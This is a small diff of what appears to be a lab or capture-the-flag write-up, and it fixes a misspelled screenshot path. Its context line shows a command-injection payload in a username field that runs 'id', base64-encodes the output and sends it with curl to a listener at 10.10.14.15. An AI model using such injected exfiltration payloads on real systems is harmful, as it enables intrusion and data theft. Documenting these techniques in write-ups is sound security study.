@@ -245,7 +245,7 @@ username=`id | base64 | xargs -I{} curl http://10.10.14.15:1111/{}`
 > Result:
 
 <p align="center">
-  <img src="./screenshots/pytohn_server_answer.png" alt="python_server_answer"/>
+  <img src="./screenshots/python_server_answer.png" alt="python_server_answer"/>
 </p>
 
 > decode answer:
